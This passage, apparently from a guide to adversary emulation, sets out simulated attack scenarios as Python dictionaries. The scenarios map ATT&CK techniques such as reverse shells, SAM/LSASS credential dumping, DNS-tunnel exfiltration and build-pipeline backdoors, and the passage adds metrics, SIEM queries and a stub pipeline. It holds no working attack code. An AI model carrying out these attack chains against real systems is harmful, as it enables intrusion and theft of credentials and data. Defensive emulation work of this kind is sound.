        "Locate and access sensitive data stores",
        "Exfiltrate simulated sensitive data",
    ],
    "techniques": [
        {"phase": "Initial Access", "technique": "T1190",
         "implementation": "Exploit web application vulnerability"},
        {"phase": "Execution", "technique": "T1059.006",
         "implementation": "Python reverse shell"},
        {"phase": "Persistence", "technique": "T1547.001",
         "implementation": "Registry run key with encoded payload"},
        {"phase": "Credential Access", "technique": "T1003.002",
         "implementation": "SAM database extraction"},
        {"phase": "Discovery", "technique": "T1087.002",
         "implementation": "Domain account enumeration"},
        {"phase": "Lateral Movement", "technique": "T1021.001",
         "implementation": "RDP with compromised credentials"},
        {"phase": "Collection", "technique": "T1005",
         "implementation": "Local file collection and staging"},
        {"phase": "Exfiltration", "technique": "T1048.003",
         "implementation": "DNS tunneling for data exfiltration"},
    ],
    "data_simulation": {
        "staging_location": "/tmp/staging",
        "fake_data_files": "Generated PII/PHI mock files",
        "exfil_size": "50MB simulated",
        "exfil_method": "DNS tunneling to controlled server",
    },
}
```

#### Scenario 3: Supply Chain Compromise Simulation

```python
supply_chain_scenario = {
    "name": "Software Supply Chain Compromise Simulation",
    "threat_actor": "SUNBURST-inspired",
    "objectives": [
        "Identify software build infrastructure",
        "Simulate compromise of build pipeline",
        "Demonstrate impact of compromised update mechanism",
        "Test detection of supply chain anomalies",
    ],
    "techniques": [
        {"phase": "Initial Access", "technique": "T1195.002",
         "implementation": "Compromise developer workstation"},
        {"phase": "Execution", "technique": "T1059.001",
         "implementation": "PowerShell-based build injection"},
        {"phase": "Persistence", "technique": "T1554",
         "implementation": "Backdoor in build output"},
        {"phase": "Defense Evasion", "technique": "T1027",
         "implementation": "Obfuscated backdoor code"},
        {"phase": "Collection", "technique": "T1005",
         "implementation": "Collect build artifacts and signing keys"},
    ],
    "safety_measures": [
        "Isolated build environment only",
        "No actual distribution of compromised packages",
        "Document all access and modifications",
        "Restore build pipeline after testing",
    ],
}
```

### Adversary Emulation Maturity Model

Assess and improve your emulation capability using this maturity model:

```python
MATURITY_MODEL = {
    "Level 1 - Ad Hoc": {
        "description": "Basic awareness of threat actors, no structured emulation",
        "characteristics": [
            "Reactive threat intelligence consumption",
            "No adversary profiles",
            "No structured TTP mapping",
            "Limited detection validation",
        ],
        "next_step": "Establish threat actor profiles for most relevant adversaries",
    },
    "Level 2 - Defined": {
        "description": "Structured profiles and TTP mapping for key threat actors",
        "characteristics": [
            "Threat actor profiles for top 3-5 adversaries",
            "MITRE ATT&CK mapping of key TTPs",
            "Manual technique implementation",
            "Periodic detection rule testing",
        ],
        "next_step": "Automate technique execution and detection validation",
    },
    "Level 3 - Managed": {
        "description": "Automated emulation with detection gap analysis",
        "characteristics": [
            "Automated TTP execution frameworks",
            "Real-time detection validation",
            "Purple team integration",
            "Metrics-driven detection improvement",
        ],
        "next_step": "Integrate with threat intelligence feeds for continuous updates",
    },
    "Level 4 - Measured": {
        "description": "Threat-informed defense with continuous improvement",
        "characteristics": [
            "Continuous threat intelligence integration",
            "Automated profile updates from intelligence",
            "Statistical detection coverage analysis",
            "Benchmark against industry peers",
        ],
        "next_step": "Predictive defense based on adversary behavior modeling",
    },
    "Level 5 - Optimizing": {
        "description": "Predictive and adaptive threat-informed defense",
        "characteristics": [
            "AI-driven adversary behavior prediction",
            "Automated detection rule generation",
            "Real-time emulation based on threat landscape",
            "Continuous purple team operations",
        ],
        "next_step": "Share learnings with industry peers and contribute to collective defense",
    },
}
```

### Emulation Metrics and KPIs

Track these metrics to measure emulation program effectiveness:

```python
class EmulationMetrics:
    """Track and report key emulation metrics"""

    def calculate_detection_coverage(self, results):
        """Calculate overall detection coverage"""
        total = len(results)
        detected = sum(1 for r in results if r.detected)
        return {
            "detection_rate": (detected / total) * 100,
            "total_techniques_tested": total,
            "detected_techniques": detected,
            "undetected_techniques": total - detected,
        }

    def calculate_mttc(self, results):
        """Calculate Mean Time to Contain"""
        containment_times = [
            r.containment_time for r in results
            if r.detected and r.containment_time is not None
        ]
        if not containment_times:
            return {"mttc": None, "status": "no_data"}
        return {
            "mttc_seconds": sum(containment_times) / len(containment_times),
            "mttc_human": self._format_time(
                sum(containment_times) / len(containment_times)
            ),
        }

    def calculate_dwell_time(self, results):
        """Calculate adversary dwell time"""
        detection_times = [
            r.detection_time for r in results if r.detected
        ]
        if not detection_times:
            return {"dwell_time": None, "status": "not_detected"}
        return {
            "average_dwell_time": sum(detection_times) / len(detection_times),
            "max_dwell_time": max(detection_times),
            "min_dwell_time": min(detection_times),
        }

    def coverage_by_tactic(self, results):
        """Calculate detection coverage by ATT&CK tactic"""
        tactic_stats = {}
        for result in results:
            tactic = result.tactic
            if tactic not in tactic_stats:
                tactic_stats[tactic] = {"total": 0, "detected": 0}
            tactic_stats[tactic]["total"] += 1
            if result.detected:
                tactic_stats[tactic]["detected"] += 1

        for tactic, stats in tactic_stats.items():
            stats["coverage_pct"] = (
                (stats["detected"] / stats["total"]) * 100
                if stats["total"] > 0 else 0
            )

        return tactic_stats

    def generate_executive_summary(self, results):
        """Generate executive-friendly summary metrics"""
        detection = self.calculate_detection_coverage(results)
        dwell = self.calculate_dwell_time(results)
        mttc = self.calculate_mttc(results)

        return {
            "headline": (
                f"Detected {detection['detection_rate']:.1f}% of emulated adversary techniques"
            ),
            "risk_rating": self._risk_from_detection_rate(detection["detection_rate"]),
            "key_findings": [
                f"{detection['undetected_techniques']} techniques went undetected",
                f"Average dwell time: {dwell.get('average_dwell_time', 'N/A')}",
                f"Mean time to contain: {mttc.get('mttc_human', 'N/A')}",
            ],
            "improvement_areas": [
                tactic for tactic, stats in
                self.coverage_by_tactic(results).items()
                if stats["coverage_pct"] < 50
            ],
        }

    def _format_time(self, seconds):
        """Format seconds into human readable time"""
        if seconds < 60:
            return f"{seconds:.0f} seconds"
        elif seconds < 3600:
            return f"{seconds / 60:.1f} minutes"
        elif seconds < 86400:
            return f"{seconds / 3600:.1f} hours"
        else:
            return f"{seconds / 86400:.1f} days"

    def _risk_from_detection_rate(self, rate):
        """Assess risk from detection rate"""
        if rate >= 90:
            return "LOW"
        elif rate >= 70:
            return "MEDIUM"
        elif rate >= 50:
            return "HIGH"
        else:
            return "CRITICAL"
```

### Integration with SIEM and Detection Platforms

```python
class SIEMIntegration:
    """Integrate emulation results with SIEM platforms"""

    def query_technique_detection(self, siem, technique_id, time_window):
        """Query SIEM for alerts related to a specific technique"""
        queries = {
            "splunk": f'index=main alert_technique_id="{technique_id}" earliest={time_window}',
            "elastic": {
                "query": {
                    "bool": {
                        "must": [
                            {"match": {"technique.id": technique_id}},
                            {"range": {"@timestamp": {"gte": time_window}}}
                        ]
                    }
                }
            },
            "sentinel": f'SecurityAlert | where TechniqueId == "{technique_id}" | where TimeGenerated >= ago({time_window})',
            "chronicle": f'risk_indicators.metadata.mitre_attack.technique_id = "{technique_id}" AND timestamp >= "{time_window}"',
        }
        return queries.get(siem.platform)

    def map_detection_rules(self, rules, techniques):
        """Map existing detection rules to ATT&CK techniques"""
        coverage = {}
        for technique in techniques:
            matched_rules = [
                rule for rule in rules
                if technique["id"] in rule.get("technique_ids", [])
            ]
            coverage[technique["id"]] = {
                "technique_name": technique["name"],
                "rules_count": len(matched_rules),
                "rules": [r["name"] for r in matched_rules],
                "coverage_quality": self._assess_rule_quality(matched_rules),
            }
        return coverage

    def _assess_rule_quality(self, rules):
        """Assess the quality of detection rules for a technique"""
        if not rules:
            return "none"
        avg_confidence = sum(r.get("confidence", 0) for r in rules) / len(rules)
        if avg_confidence >= 0.9:
            return "high"
        elif avg_confidence >= 0.7:
            return "medium"
        return "low"
```

### Emulation Automation Pipeline

```python
class EmulationPipeline:
    """Automated pipeline for adversary emulation"""

    def __init__(self, profile, environment):
        self.profile = profile
        self.environment = environment
        self.results = []

    def run_full_emulation(self):
        """Execute complete emulation pipeline"""
        phases = [
            ("reconnaissance", self._phase_recon),
            ("initial_access", self._phase_initial_access),
            ("execution", self._phase_execution),
            ("persistence", self._phase_persistence),
            ("privilege_escalation", self._phase_privesc),
            ("lateral_movement", self._phase_lateral),
            ("collection", self._phase_collection),
            ("exfiltration", self._phase_exfil),
        ]

        for phase_name, phase_func in phases:
            print(f"\n[*] Executing phase: {phase_name}")
            try:
                result = phase_func()
                self.results.append({
                    "phase": phase_name,
                    "success": result["success"],
                    "detected": result.get("detected", False),
                    "details": result,
                })
                print(f"    Success: {result['success']}")
                print(f"    Detected: {result.get('detected', 'unknown')}")
            except Exception as e:
                self.results.append({
                    "phase": phase_name,
                    "success": False,
                    "error": str(e),
                })
                print(f"    Error: {e}")

        return self.results

    def _phase_recon(self):
        """Reconnaissance phase"""
        return {"success": True, "technique": "T1595.001",
                "details": "Active scanning completed"}

    def _phase_initial_access(self):
        """Initial access phase"""
        return {"success": True, "technique": "T1566.001",
                "details": "Spearphishing delivered"}

    def _phase_execution(self):
        """Execution phase"""
        return {"success": True, "technique": "T1059.001",
                "detected": False, "details": "PowerShell execution"}

    def _phase_persistence(self):
        """Persistence phase"""
        return {"success": True, "technique": "T1053.005",
                "detected": False, "details": "Scheduled task created"}

    def _phase_privesc(self):
        """Privilege escalation phase"""
        return {"success": True, "technique": "T1003.001",
                "detected": False, "details": "LSASS dump successful"}

    def _phase_lateral(self):
        """Lateral movement phase"""
        return {"success": True, "technique": "T1021.002",
                "detected": True, "details": "SMB lateral movement"}

    def _phase_collection(self):
        """Collection phase"""
        return {"success": True, "technique": "T1005",
                "detected": False, "details": "Data staged"}

    def _phase_exfil(self):
        """Exfiltration phase"""
        return {"success": True, "technique": "T1041",
                "detected": True, "details": "Data exfiltrated over C2"}
```
